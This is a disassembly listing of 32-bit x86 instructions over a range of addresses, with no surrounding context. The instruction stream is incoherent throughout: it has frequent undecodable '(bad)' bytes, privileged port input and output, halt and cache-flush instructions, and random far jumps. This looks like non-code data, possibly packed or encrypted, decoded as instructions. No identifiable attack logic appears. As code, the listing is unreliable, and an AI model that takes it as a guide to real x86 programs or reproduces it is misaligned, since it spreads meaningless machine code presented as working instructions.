  412caf:	punpckldq mm0,DWORD PTR [ebx]
  412cb2:	out    dx,al
  412cb3:	jns    0x412c70
  412cb5:	adc    ebx,DWORD PTR [eax-0x79cf7545]
  412cbb:	aas    
  412cbc:	inc    edi
  412cbd:	lea    edi,[esi+0x7b]
  412cc0:	dec    ebp
  412cc1:	pop    es
  412cc2:	cmp    DWORD PTR [edx+0xb8fe7f8],ebp
  412cc8:	test   BYTE PTR [eax-0x2dcf33a7],ch
  412cce:	mov    esp,0xb7c5556d
  412cd3:	int    0x50
  412cd5:	cmp    al,0xd5
  412cd7:	sub    ecx,DWORD PTR [edi]
  412cd9:	lahf   
  412cda:	fisttp WORD PTR [eax]
  412cdc:	jge    0x412d02
  412cde:	dec    edx
  412cdf:	sti    
  412ce0:	mov    eax,0x11de1679
  412ce5:	out    dx,eax
  412ce6:	out    dx,al
  412ce7:	sub    al,0x72
  412ce9:	(bad)  
  412ceb:	inc    eax
  412cec:	lahf   
  412ced:	push   ecx
  412cee:	xor    ebp,edx
  412cf0:	dec    ebp
  412cf1:	lods   al,BYTE PTR ds:[esi]
  412cf2:	push   edi
  412cf3:	xchg   ah,dl
  412cf5:	adc    DWORD PTR [esi+edx*1],esi
  412cf8:	mov    edi,0x7b7ce34b
  412cfd:	push   edi
  412cfe:	jle    0x412c9c
  412d00:	inc    edx
  412d01:	jl     0x412cd9
  412d03:	(bad)  
  412d04:	cmc    
  412d05:	sub    DWORD PTR [ecx],ebx
  412d07:	ss add al,0x55
  412d0a:	lahf   
  412d0b:	jae    0x412cf8
  412d0d:	sbb    al,0x5d
  412d0f:	pusha  
  412d10:	cmp    eax,0x8af365b4
  412d15:	dec    esp
  412d16:	iret   
  412d17:	out    0xe8,eax
  412d19:	add    BYTE PTR [ebp+0x50],0x3c
  412d1d:	add    BYTE PTR [edx],dh
  412d1f:	inc    edi
  412d20:	enter  0x3413,0xc9
  412d24:	pop    ebx
  412d25:	nop
  412d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d27:	inc    esi
  412d28:	(bad)  
  412d29:	mov    ds:0xdaa3cac7,eax
  412d2e:	adc    DWORD PTR [edx],0x1ab9e7ac
  412d34:	mov    bh,0x83
  412d36:	je     0x412d47
  412d38:	adc    DWORD PTR [ecx-0x23753942],0x69
  412d3f:	mov    BYTE PTR [ebp-0x30],al
  412d42:	and    eax,0xc7b12e1d
  412d47:	jne    0x412d58
  412d49:	sbb    eax,0xb575147
  412d4e:	or     DWORD PTR [edx-0x7ab6bac1],edi
  412d54:	or     bl,bh
  412d56:	imul   BYTE PTR [edx+esi*8]
  412d59:	mov    al,ds:0x6cbc289c
  412d5e:	sub    ah,BYTE PTR [esi+ecx*1-0x16]
  412d62:	adc    edx,DWORD PTR [ecx]
  412d64:	aaa    
  412d65:	pop    edx
  412d66:	icebp  
  412d67:	inc    edi
  412d68:	lods   al,BYTE PTR ds:[esi]
  412d69:	push   cs
  412d6a:	sub    ch,al
  412d6c:	sub    al,0xdb
  412d6e:	int3   
  412d6f:	lods   eax,DWORD PTR ds:[esi]
  412d70:	jno    0x412dad
  412d72:	gs inc ebp
  412d74:	dec    ecx
  412d75:	or     BYTE PTR [edx],bh
  412d77:	retf   
  412d78:	sar    edx,1
  412d7a:	fdiv   DWORD PTR [eax+0x4896071a]
  412d80:	in     al,0xce
  412d82:	xor    ecx,DWORD PTR cs:[edx-0x4dfa6b]
  412d89:	clc    
  412d8a:	inc    bl
  412d8c:	add    eax,edx
  412d8e:	retf   0xd9f2
  412d91:	arpl   WORD PTR [ebp+0x48],bx
  412d94:	xchg   BYTE PTR [edi+0x4b01c7b9],ah
  412d9a:	xchg   dl,dl
  412d9c:	outs   dx,BYTE PTR ds:[esi]
  412d9d:	js     0x412e05
  412d9f:	jge    0x412d53
  412da1:	lea    ebp,[eax+ebp*8+0x18]
  412da5:	es push es
  412da7:	jne    0x412d71
  412da9:	adc    bh,BYTE PTR [esi-0x32984676]
  412daf:	sub    ebp,DWORD PTR [esi]
  412db1:	mov    al,ds:0x438dd2ca
  412db6:	push   ebp
  412db7:	xchg   edi,eax
  412db8:	test   BYTE PTR [ecx-0x3ac9f18f],cl
  412dbe:	jbe    0x412d74
  412dc0:	adc    edi,DWORD PTR [eax+edx*2+0x4704f3e]
  412dc7:	pop    esp
  412dc8:	shl    DWORD PTR [edx-0x12a67b99],0xe5
  412dcf:	cld    
  412dd0:	stos   DWORD PTR es:[edi],eax
  412dd1:	adc    eax,0xebfa0a6e
  412dd6:	pop    ds
  412dd7:	push   ds
  412dd8:	repnz dec al
  412ddb:	ja     0x412da8
  412ddd:	push   esi
  412dde:	push   es
  412ddf:	wbinvd 
  412de1:	inc    eax
  412de2:	ret    
  412de3:	adc    esi,ebx
  412de5:	sub    BYTE PTR [edi+ecx*4],dl
  412de8:	mov    eax,ds:0xb4f90167
  412ded:	add    bh,BYTE PTR [ecx+0x55]
  412df0:	sbb    ah,BYTE PTR [ecx]
  412df2:	sbb    eax,0xb6905b1
  412df7:	pop    edx
  412df8:	cmp    al,0xbb
  412dfa:	into   
  412dfb:	jecxz  0x412d97
  412dfd:	(bad)  
  412dff:	inc    esp
  412e00:	sbb    esp,DWORD PTR [eax+0x8435c05]
  412e06:	cld    
  412e07:	adc    ebp,DWORD PTR [esi]
  412e09:	(bad)  
  412e0b:	pop    esi
  412e0c:	pop    eax
  412e0d:	dec    ebx
  412e0e:	add    eax,0x683db372
  412e13:	in     al,0xf2
  412e15:	out    0x9c,al
  412e17:	(bad)  
  412e18:	mov    al,0xe7
  412e1a:	xor    DWORD PTR [eax],ebp
  412e1c:	retf   0x7c42
  412e1f:	mov    edi,0x2f79ccb
  412e24:	sub    eax,0x555cef4
  412e29:	xchg   edi,eax
  412e2a:	fist   WORD PTR [edx+0x2b]
  412e2d:	cmp    DWORD PTR [edx+0x1a4167],edx
  412e33:	xor    eax,DWORD PTR [esp+ebx*4-0xd]
  412e37:	shr    ebp,0xf9
  412e3a:	xchg   DWORD PTR [edi-0x7],edi
  412e3d:	mov    ebx,0xae3c02f1
  412e42:	add    al,0xea
  412e44:	xor    BYTE PTR [esi+0x4b40ffc1],dh
  412e4a:	xchg   edi,eax
  412e4b:	mov    WORD PTR [edi+0xf83a20],gs
  412e51:	cmp    DWORD PTR [eax+0x450ff471],0x69c9742d
  412e5b:	iret   
  412e5c:	ja     0x412e90
  412e5e:	sub    eax,0xee0f6e42
  412e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e64:	inc    edi
  412e65:	push   eax
  412e66:	xchg   DWORD PTR [ebp+0x53b077ad],eax
  412e6c:	mov    al,0x4a
  412e6e:	es popf 
  412e70:	jmp    FWORD PTR [eax+eax*8-0x47e2b003]
  412e77:	mov    edi,0xd2343b32
  412e7c:	out    0x86,eax
  412e7e:	cmc    
  412e7f:	test   BYTE PTR [ebx],bl
  412e81:	(bad)  
  412e82:	out    0x6f,al
  412e84:	sbb    al,0x3
  412e86:	inc    edx
  412e87:	jnp    0x412f01
  412e89:	cmp    esp,DWORD PTR [ebp+eax*8-0x7f610ab6]
  412e90:	xor    esi,DWORD PTR [ebp-0x71]
  412e93:	shl    DWORD PTR [edx-0x4c],0xde
  412e97:	(bad)  
  412e98:	mov    gs,WORD PTR [edx+0x4b77b3ad]
  412e9e:	lods   al,BYTE PTR ds:[esi]
  412e9f:	sbb    DWORD PTR [ecx+0x1a7336fd],ebx
  412ea5:	mov    BYTE PTR [ebx+0x34],ah
  412ea8:	xor    BYTE PTR [edx-0x75],ah
  412eab:	shl    DWORD PTR [eax-0x16cbb61],cl
  412eb1:	(bad)  
  412eb2:	or     al,0xf9
  412eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eb5:	or     al,0x50
  412eb7:	jno    0x412e9b
  412eb9:	mov    cl,BYTE PTR [ebx+edx*4+0x70]
  412ebd:	cli    
  412ebe:	adc    DWORD PTR [edx+0x16],esi
  412ec1:	sbb    eax,0x988a0f55
  412ec6:	stc    
  412ec7:	dec    edx
  412ec8:	pop    es
  412ec9:	retf   0x63e5
  412ecc:	inc    ecx
  412ecd:	or     al,0x8b
  412ecf:	mov    ebp,0x4b719d71
  412ed4:	rcl    DWORD PTR [edi-0x64],0x70
  412ed8:	inc    edi
  412ed9:	jge    0x412f2e
  412edb:	mov    ecx,0xc162ab64
  412ee0:	mov    ch,0x3f
  412ee2:	lahf   
  412ee3:	dec    ebp
  412ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ee5:	pop    edi
  412ee6:	push   edi
  412ee7:	xchg   esi,eax
  412ee8:	cmp    edi,DWORD PTR [edi-0x176f9706]
  412eee:	ins    DWORD PTR es:[edi],dx
  412eef:	int    0xf0
  412ef1:	xlat   BYTE PTR ds:[ebx]
  412ef2:	mov    ah,al
  412ef4:	pop    edi
  412ef5:	pop    ebx
  412ef6:	iret   
  412ef7:	mov    edi,0x7333fd04
  412efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412efd:	fsub   DWORD PTR [ebx+0x43]
  412f00:	scas   eax,DWORD PTR es:[edi]
  412f01:	call   0x62a669fe
  412f06:	scas   al,BYTE PTR es:[edi]
  412f07:	in     al,dx
  412f08:	and    BYTE PTR [eax-0x51],bh
  412f0b:	int3   
  412f0c:	sti    
  412f0d:	xor    cl,BYTE PTR [eax+ecx*4]
  412f10:	stos   BYTE PTR es:[edi],al
  412f11:	iret   
  412f12:	stc    
  412f13:	rol    BYTE PTR [eax+eax*4],cl
  412f16:	xchg   ecx,eax
  412f17:	call   0xfa6f:0x892b7911
  412f1e:	adc    DWORD PTR [ebx-0x4e],ebx
  412f21:	push   ebp
  412f22:	sub    ebp,ecx
  412f24:	add    DWORD PTR [ebx-0x5728f88f],ecx
  412f2a:	retf   0x6de9
  412f2d:	repnz fcmovnu st,st(5)
  412f30:	sbb    ebx,0xffffffc0
  412f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f34:	repz xchg edx,eax
  412f36:	mov    edx,0xdbc77d7f
  412f3b:	icebp  
  412f3c:	add    al,0xd1
  412f3e:	repz fcomp QWORD PTR [eax+0x28]
  412f42:	aaa    
  412f43:	mov    edx,0x658e0571
  412f48:	jge    0x412f68
  412f4a:	mov    ch,0x60
  412f4c:	mov    bh,0x3d
  412f4e:	in     eax,dx
  412f4f:	fist   DWORD PTR [ecx-0x2b]
  412f52:	arpl   WORD PTR [edx],bx
  412f54:	xchg   BYTE PTR [ebx+eax*4+0x57],ah
  412f58:	jmp    0x412ef9
  412f5a:	xchg   edx,eax
  412f5b:	ins    BYTE PTR es:[edi],dx
  412f5c:	sbb    al,0xf0
  412f5e:	cdq    
  412f5f:	jle    0x412f05
  412f61:	sub    edi,esi
  412f63:	push   eax
  412f64:	xchg   ebp,eax
  412f65:	xchg   edi,eax
  412f66:	mov    esp,0x3d39b306
  412f6b:	xor    cl,BYTE PTR [eax+0x73]
  412f6e:	push   esi
  412f6f:	mov    eax,0x6d9f0f70
  412f74:	xchg   ebp,eax
  412f75:	in     eax,dx
  412f76:	sbb    ebp,DWORD PTR [ebp+esi*4-0x3dade9d8]
  412f7d:	(bad)  
  412f7e:	pop    esi
  412f7f:	lods   al,BYTE PTR ds:[esi]
  412f80:	cmp    cl,bl
  412f82:	mov    eax,ds:0x303a666b
  412f87:	jno    0x412f28
  412f89:	fstp   QWORD PTR [edx-0x3f70954f]
  412f8f:	or     al,0xda
  412f91:	aad    0x87
  412f93:	push   ebx
  412f94:	add    DWORD PTR [esi-0x32],ebp
  412f97:	add    esi,DWORD PTR [edi-0x9eeec7a]
  412f9d:	or     bl,BYTE PTR [esi+ebp*8-0x168e5dc1]
  412fa4:	xchg   edi,eax
  412fa5:	sbb    bl,dh
  412fa7:	add    cl,BYTE PTR [ebx-0x12a32c64]
  412fad:	push   ss
  412fae:	sbb    al,0xe3
  412fb0:	lods   al,BYTE PTR ds:[esi]
  412fb1:	lods   al,BYTE PTR ds:[esi]
  412fb2:	inc    ebx
  412fb3:	sar    dh,0x72
  412fb6:	adc    DWORD PTR [eax+edi*4-0x6c],eax
  412fba:	out    0xd9,al
  412fbc:	jmp    0x412ff0
  412fbe:	and    DWORD PTR [esi+edx*4-0x3fc8ca2c],0x29
  412fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fc7:	sub    BYTE PTR [ebx+0x43],ah
  412fca:	cmp    DWORD PTR [esi],eax
  412fcc:	and    al,0xff
  412fce:	mov    edx,0xf3a04d36
  412fd3:	(bad)  
  412fd4:	cmp    ebx,DWORD PTR [ebx-0x3d]
  412fd7:	mov    ebx,esi
  412fd9:	sar    DWORD PTR [esi+0x6c],1
  412fdc:	lock jle 0x413025
  412fdf:	out    dx,eax
  412fe0:	cmp    eax,DWORD PTR [edx+0x5be35e50]
  412fe6:	adc    DWORD PTR ds:0x321678c8,ecx
  412fec:	addr16 jbe 0x413016
  412fef:	xor    eax,0x4091227a
  412ff4:	ins    DWORD PTR es:[edi],dx
  412ff5:	shr    DWORD PTR [ebx+0x7e],cl
  412ff8:	or     eax,0x2972b137
  412ffd:	sub    al,0xc4
  412fff:	xor    DWORD PTR [eax-0x7f],edi
  413002:	mov    eax,ds:0x7721edc6
  413007:	mov    ebx,0xf0d60c91
  41300c:	mov    eax,0x7b8785e1
  413011:	loop   0x412fab
  413013:	xchg   edx,eax
  413014:	nop
  413015:	or     BYTE PTR [ebx+eiz*8+0x47],ch
  413019:	adc    DWORD PTR [ecx+0x43],ebx
  41301c:	fisttp DWORD PTR [ebx+0x45285c06]
  413022:	and    bh,bh
  413024:	push   eax
  413025:	add    BYTE PTR [ebp-0x5632dca0],0x51
  41302c:	dec    edi
  41302d:	push   ebp
  41302e:	(bad)
  413031:	leave  
  413032:	ficom  WORD PTR [edx+ecx*8+0x29]
  413036:	in     eax,0x77
  413038:	xor    DWORD PTR [esi+eax*4],esp
  41303b:	(bad)  
  41303d:	mov    ebp,0x9eee19fd
  413042:	add    DWORD PTR [edx+edx*1-0x67f60982],0x7d
  41304a:	out    0x2a,al
  41304c:	aam    0x73
  41304e:	add    al,BYTE PTR [ebp+0x59]
  413051:	jnp    0x413043
  413053:	mov    edx,0x237721d7
  413058:	sbb    eax,0x3f87e098
  41305d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41305e:	and    BYTE PTR [ebx],cl
  413060:	fcomp  QWORD PTR [edx+0x0]
  413063:	mov    ch,0x32
  413065:	pop    ds
  413066:	mov    ds:0x669e506a,al
  41306b:	int3   
  41306c:	xor    DWORD PTR [edi],ebx
  41306e:	pop    ebp
  41306f:	add    DWORD PTR [edx],edi
  413071:	jmp    0x10af1df1
  413076:	inc    esp
  413077:	ficomp WORD PTR [esp+ebx*4-0x77]
  41307b:	rcl    BYTE PTR ds:0x15cb4a4,1
  413081:	cdq    
  413082:	adc    BYTE PTR [ebp+0xf],dl
  413085:	imul   ebp,esi,0x508045bc
  41308b:	add    BYTE PTR [ecx],al
  41308d:	in     eax,dx
  41308e:	out    dx,al
  41308f:	pop    eax
  413090:	cwde   
  413091:	xchg   ebp,eax
  413092:	add    al,0xd8
  413094:	fisttp QWORD PTR [esi]
  413096:	cmp    ah,BYTE PTR [edx-0x30]
  413099:	fadd   QWORD PTR [ebx-0x5669484b]
  41309f:	dec    esp
  4130a0:	mov    bl,0xb5
  4130a2:	and    BYTE PTR ds:0x10b20767,cl
  4130a9:	push   eax
  4130aa:	mov    bh,0xb4
  4130ac:	sub    sp,WORD PTR [ebp-0x7869afef]
  4130b3:	ffree  st(3)
  4130b5:	xchg   edi,eax
  4130b6:	ins    BYTE PTR es:[edi],dx
  4130b7:	(bad)  
  4130b8:	imul   ebp,ebp,0xffffff9f
  4130bb:	mov    ecx,0xd887e3de
  4130c0:	inc    edi
  4130c1:	jns    0x413052
  4130c3:	jnp    0x4130b5
  4130c5:	sub    al,BYTE PTR [eax*2+0x194ed820]
  4130cc:	push   0xf938ee4f
  4130d1:	inc    edx
  4130d2:	pushf  
  4130d3:	sbb    esp,DWORD PTR [ebx]
  4130d5:	add    al,0xdb
  4130d7:	xchg   ecx,eax
  4130d8:	jecxz  0x413145
  4130da:	cmp    al,0x5e
  4130dc:	ficomp DWORD PTR ds:0xc2bebcd
  4130e2:	ficom  WORD PTR [edx]
  4130e4:	cld    
  4130e5:	(bad)  [ebx+0x19]
  4130e8:	mov    ch,0x2f
  4130ea:	inc    eax
  4130eb:	bound  edx,QWORD PTR [esi+0x42]
  4130ee:	add    esp,esp
  4130f0:	andnps xmm1,XMMWORD PTR [ebx]
  4130f3:	push   ecx
  4130f4:	inc    ebp
  4130f5:	pop    ds
  4130f6:	(bad)  
  4130f7:	sar    bl,cl
  4130f9:	mov    edi,0xf5529aeb
  4130fe:	inc    edx
  4130ff:	lahf   
  413100:	xchg   ebp,eax
  413101:	pop    esp
  413102:	loope  0x4130c7
  413104:	dec    eax
  413105:	iret   
  413106:	fild   WORD PTR [eax+0x37]
  413109:	or     eax,DWORD PTR [eax]
  41310b:	or     al,0x21
  41310d:	xchg   DWORD PTR [ecx],ebp
  41310f:	fcmove st,st(1)
  413111:	ja     0x413149
  413113:	push   eax
  413114:	gs addr16 mov esp,0x2b0b85e
  41311b:	add    eax,0x23eccfb2
  413120:	(bad)  
  413121:	jmp    0x4130d4
  413123:	pusha  
  413124:	mov    ah,0xf2
  413126:	stos   BYTE PTR es:[edi],al
  413127:	addr16 sub eax,0xb548ab2d
  41312d:	mov    eax,0x7f07ea19
  413132:	shr    BYTE PTR [eax+0x36],0xe0
  413136:	xlat   BYTE PTR ds:[ebx]
  413137:	mov    BYTE PTR [eax+0x71],ah
  41313a:	sub    al,0xda
  41313c:	mov    cl,0xe4
  41313e:	sub    DWORD PTR [ebp+0x35],ebp
  413141:	sub    cl,bl
  413143:	adc    ebp,0xffffffec
  413146:	or     DWORD PTR [esi-0x53de2a22],edx
  41314c:	mov    edx,0xbd575edf
  413151:	es int3 
  413153:	fld    st(4)
  413155:	xor    al,0x20
  413157:	dec    ecx
  413158:	dec    ebx
  413159:	xchg   esp,eax
  41315a:	inc    ebx
  41315b:	pop    esp
  41315c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41315d:	dec    esp
  41315e:	jmp    0x1a9b:0xd8b5ef79
  413165:	mov    WORD PTR [esi-0x38],?
  413168:	loope  0x413131
  41316a:	jb     0x41315d
  41316c:	fist   WORD PTR [ebx]
  41316e:	outs   dx,BYTE PTR ds:[esi]
  41316f:	pop    ds
  413170:	mov    esi,0x7b8d473f
  413175:	iret   
  413176:	popf   
  413177:	lock and eax,0x98541a3b
  41317d:	jecxz  0x4131e7
  41317f:	jge    0x413190
  413181:	jmp    0x106e:0x8f81e260
  413188:	aaa    
  413189:	or     edi,edi
  41318b:	imul   ebx,DWORD PTR [eax-0x415ddfed],0x50186d28
  413195:	push   ebx
  413196:	mov    DWORD PTR [ebp+edi*4-0x68aad40c],esi
  41319d:	dec    ebp
  41319e:	or     ebp,DWORD PTR [esi]
  4131a0:	cmp    cl,cl
  4131a2:	xor    eax,0x726de3b4
  4131a7:	cmp    al,0x24
  4131a9:	xor    DWORD PTR [edx-0x17],ecx
  4131ac:	sbb    BYTE PTR [eax],ch
  4131ae:	jnp    0x413229
  4131b0:	leave  
  4131b1:	mov    ebp,0x6f757d82
  4131b6:	fs cli 
  4131b8:	cvtps2pd xmm5,QWORD PTR [edi]
  4131bb:	test   al,0x44
  4131bd:	adc    al,BYTE PTR [ebp+0x6d]
  4131c0:	in     al,0x86
  4131c2:	int    0xb1
  4131c4:	push   ebx
  4131c5:	push   0xffffffe6
  4131c7:	cwde   
  4131c8:	xchg   BYTE PTR [edi-0x7],dh
  4131cb:	outs   dx,DWORD PTR ds:[esi]
  4131cc:	inc    ecx
  4131cd:	mov    ecx,0x665b76f2
  4131d2:	push   ecx
  4131d3:	pop    ebp
  4131d4:	in     al,0x3e
  4131d6:	(bad)  
  4131d7:	movntps XMMWORD PTR [ebx+edi*1+0x1ca9e531],xmm5
  4131df:	and    esi,DWORD PTR [ebp-0x6f653bbb]
  4131e5:	or     eax,0x315d9b53
  4131ea:	push   edi
  4131eb:	and    BYTE PTR [edi],al
  4131ed:	add    dh,BYTE PTR [ebx]
  4131ef:	into   
  4131f0:	and    al,0x5e
  4131f2:	xchg   DWORD PTR [esi+ebp*8+0x55],edx
  4131f6:	xchg   edi,eax
  4131f7:	jnp    0x413277
  4131f9:	dec    ecx
  4131fa:	nop
  4131fb:	push   ds
  4131fc:	cdq    
  4131fd:	push   ss
  4131fe:	xor    cl,dh
  413200:	icebp  
  413201:	shl    BYTE PTR [edx],1
  413203:	ja     0x41326a
  413205:	or     ah,BYTE PTR [edi-0x72]
  413208:	out    0x39,eax
  41320a:	pxor   mm1,QWORD PTR [edx+0x24d26247]
  413211:	outs   dx,DWORD PTR ds:[esi]
  413212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413213:	scas   eax,DWORD PTR es:[edi]
  413214:	imul   ebx,DWORD PTR [edi],0xfffffff6
  413217:	out    0xfa,al
  413219:	nop
  41321a:	aas    
  41321b:	cmp    al,0x9a
  41321d:	jmp    0x3f198bea
  413222:	xchg   esp,eax
  413223:	mov    al,0x8f
  413225:	jb     0x413208
  413227:	hlt    
  413228:	mov    ebp,0x840d360e
  41322e:	cmp    DWORD PTR ds:0xa8c683d1,edi
  413234:	pop    esp
  413235:	push   ebp
  413236:	cld    
  413237:	xor    esi,ecx
  413239:	jp     0x4132a9
  41323b:	sub    eax,DWORD PTR [ebp+0x25]
  41323e:	pop    ecx
  41323f:	js     0x4131dd
  413241:	rcr    DWORD PTR ds:0x96a91719,1
  413247:	push   0xbf432a78
  41324c:	dec    ebx
  41324d:	call   0xd5d1:0x79639e5
  413254:	pop    ebp
  413255:	jnp    0x413201
  413257:	xor    ch,BYTE PTR [esi+ebx*4-0x5c]
  41325b:	cld    
  41325c:	(bad)  
  41325d:	int3   
  41325e:	out    dx,eax
  41325f:	ja     0x413202
  413261:	int3   
  413262:	ds push esi
  413264:	pusha  
  413265:	mov    edi,0x6a37d9eb
  41326a:	sub    DWORD PTR [ebp-0x62f9f600],0x5e
  413271:	repz push 0xffffffe0
  413274:	push   ecx
  413275:	fld    TBYTE PTR ds:0xec89f832
  41327b:	lods   al,BYTE PTR ds:[esi]
  41327c:	mov    ebp,DWORD PTR [ebx+ebp*2]
  41327f:	lea    esi,[edi-0x5c34becc]
  413285:	shl    DWORD PTR [ecx],0x16
  413288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413289:	sbb    bh,bh
  41328b:	fdiv   DWORD PTR [ebp+0x30e3a423]
  413291:	and    ebx,DWORD PTR [eax+eax*2+0x1c]
  413295:	leave  
  413296:	dec    BYTE PTR [esp+edi*4]
  413299:	dec    edx
  41329a:	sbb    al,0xe0
  41329c:	pop    ebp
  41329d:	call   0x71542dd0
  4132a2:	into   
  4132a3:	cdq    
  4132a4:	rol    DWORD PTR [ecx+0x62aebe11],cl
  4132aa:	mov    edi,0x54a1d7b7
  4132af:	pop    eax
  4132b0:	pop    ebx
  4132b1:	scas   eax,DWORD PTR es:[edi]
  4132b2:	sti    
  4132b3:	(bad)  
  4132b4:	dec    edx
  4132b5:	ss (bad) 
  4132b7:	frstor [eax]
  4132b9:	xchg   edx,eax
  4132ba:	adc    DWORD PTR [ecx],eax
  4132bc:	xor    DWORD PTR [ebp+0x2f],edx
  4132bf:	test   al,0x88
  4132c1:	xlat   BYTE PTR gs:[ebx]
  4132c3:	ficom  WORD PTR [edi+0x29]
  4132c6:	jle    0x413294
  4132c8:	xchg   ecx,eax
  4132c9:	(bad)  
  4132ca:	out    dx,al
  4132cb:	icebp  
  4132cc:	add    eax,0xceba1dbd
  4132d1:	test   DWORD PTR [ebx],0xe60535c1
  4132d7:	push   ds
  4132d8:	dec    edx
  4132d9:	and    ebp,DWORD PTR [ebx+0x2576f7ea]
  4132df:	gs aad 0x17
  4132e2:	je     0x413355
  4132e4:	out    dx,al
  4132e5:	call   0xc1461841
  4132ea:	mov    BYTE PTR [ebx+0x41f44e77],bl
  4132f0:	adc    DWORD PTR [eax+0x7a],0xffffffd7
  4132f4:	jb     0x41331e
  4132f6:	in     al,0xe9
  4132f8:	sti    
  4132f9:	das    
  4132fa:	mov    ebx,0x3b05bbfc
  4132ff:	mov    ds:0x8b4406fa,eax
  413304:	xor    edx,0x6bb5f4d7
  41330a:	fsubr  DWORD PTR [eax-0x23]
  41330d:	dec    esp
  41330e:	jl     0x41337f
  413310:	or     dl,BYTE PTR [edi]
  413312:	popa   
  413313:	dec    eax
  413314:	retf   0xc403
  413317:	mov    fs,esi
  413319:	xor    al,0x53
  41331b:	jecxz  0x413335
  41331d:	inc    edx
  41331e:	addr16 or eax,0xa5393c9a
  413324:	pushf  
  413325:	arpl   WORD PTR [ecx+0x25],di
  413328:	cs push eax
  41332a:	adc    al,0xf1
  41332c:	push   edi
  41332d:	push   ebx
  41332e:	dec    esi
  41332f:	mov    dl,0x67
  413331:	aaa    
  413332:	xor    BYTE PTR [edi-0x117983db],0x7
  413339:	inc    edx
  41333a:	lahf   
  41333b:	pop    ecx
  41333c:	jmp    0x3c2aa64a
  413341:	lahf   
  413342:	neg    BYTE PTR [eax+0x32]
  413345:	inc    edi
  413346:	mov    edi,0xe4f32cd9
  41334b:	mov    al,0xcf
  41334d:	sbb    BYTE PTR [eax-0x3e31bcf7],bh
  413353:	pop    edi
  413354:	gs push ebx
  413356:	scas   eax,DWORD PTR es:[edi]
  413357:	cli    
  413358:	cwde   
  413359:	icebp  
  41335a:	xor    DWORD PTR [ebx+0x4efaf265],esi
  413360:	icebp  
  413361:	into   
  413362:	mov    esp,0x8272ab2d
  413367:	pushf  
  413368:	ss jge 0x4133cd
  41336b:	add    DWORD PTR [edi+ebp*8],ebp
  41336e:	sti    
  41336f:	pop    es
  413370:	mov    es,WORD PTR [esi]
  413372:	jnp    0x413311
  413374:	imul   ch
  413376:	retf   
  413377:	imul   esi,DWORD PTR [edi+0x7f569213],0xddf74c91
  413381:	in     al,dx
  413382:	clc    
  413383:	outs   dx,DWORD PTR ds:[esi]
  413384:	push   edx
  413385:	out    dx,eax
  413386:	clc    
  413387:	loop   0x413311
  413389:	out    0xe4,al
  41338b:	popa   
  41338c:	daa    
  41338d:	aam    0x89
  41338f:	cmc    
  413390:	aaa    
  413391:	push   ecx
  413392:	aaa    
  413393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413394:	cmp    dl,BYTE PTR [edi]
  413396:	in     eax,0x75
  413398:	ins    BYTE PTR es:[edi],dx
  413399:	sbb    eax,0x776e1beb
  41339e:	jb     0x4133e0
  4133a0:	mov    bh,0x4e
  4133a2:	pushf  
  4133a3:	cs pusha 
  4133a5:	push   es
  4133a6:	push   ecx
  4133a7:	mov    bh,0x53
  4133a9:	ss ins DWORD PTR es:[edi],dx
  4133ab:	(bad)  
  4133ac:	in     eax,dx
  4133ad:	sub    eax,0xdd2e8ffc
  4133b2:	jp     0x4133ed
  4133b4:	jbe    0x413386
  4133b6:	mov    bh,0xac
  4133b8:	xchg   esi,eax
  4133b9:	cld    
  4133ba:	arpl   WORD PTR [eax-0x5147d881],di
  4133c0:	jo     0x41338a
  4133c2:	ret    0x71b3
  4133c5:	dec    ebp
  4133c6:	push   0x2619aaf2
  4133cb:	xchg   ebp,eax
  4133cc:	xor    eax,DWORD PTR [edi+eax*8]
  4133cf:	test   DWORD PTR [esi],eax
  4133d1:	jle    0x4133c4
  4133d3:	icebp  
  4133d4:	hlt    
  4133d5:	rol    esi,0x24
  4133d8:	mov    dh,0x3e
  4133da:	outs   dx,DWORD PTR ds:[esi]
  4133db:	or     ebx,esi
  4133dd:	jmp    0x739abfed
  4133e2:	mov    ah,ch
  4133e4:	xchg   ecx,eax
  4133e5:	jmp    0x78af:0x5b6e0d13
  4133ec:	out    dx,eax
  4133ed:	mov    edx,0xb2017709
  4133f2:	ror    dl,1
  4133f4:	xlat   BYTE PTR ds:[ebx]
  4133f5:	and    cl,BYTE PTR [esi+0x58]
  4133f8:	(bad)  
  4133f9:	fptan  
  4133fb:	imul   ecx,DWORD PTR [edi+0x6c3bc76f],0x3d29603f
  413405:	xchg   ecx,eax
  413406:	fistp  DWORD PTR [edi-0x54]
  413409:	(bad)  
  41340a:	and    esp,esi
  41340c:	imul   esi,DWORD PTR [eax-0x42b9f5e4],0x74cde029
  413416:	enter  0xb5c9,0x7b
  41341a:	push   0x6a
  41341c:	cmp    eax,0x1b587458
  413421:	lods   eax,DWORD PTR ds:[esi]
  413422:	dec    eax
  413423:	cmp    BYTE PTR [esi],ch
  413425:	dec    edx
  413426:	dec    ecx
  413427:	add    esp,DWORD PTR [edx+0x0]
  41342a:	test   DWORD PTR [eax+0x420660d5],esi
  413430:	or     al,0x8
  413432:	sti    
  413433:	fsubr  st,st(4)
  413435:	sub    eax,0xe471d57d
  41343a:	push   ss
  41343b:	sub    DWORD PTR ss:[eax-0x3479a766],ebp
  413442:	sbb    al,0x11
  413444:	adc    esp,DWORD PTR [eax]
  413446:	in     al,dx
  413447:	lahf   
  413448:	ficom  DWORD PTR [edx+ecx*4-0x225c5206]
  41344f:	in     eax,0x34
  413451:	adc    edx,edi
  413453:	mov    ch,0x99
  413455:	lock cmp DWORD PTR [edi],0xffffff9f
  413459:	daa    
  41345a:	inc    esp
  41345b:	and    DWORD PTR [esp+edi*4],edi
  41345e:	ror    DWORD PTR [edi],1
  413460:	adc    DWORD PTR [ebp+0x1],0x7c774347
  413467:	or     eax,0xc1856559
  41346c:	in     al,0x2d
  41346e:	sti    
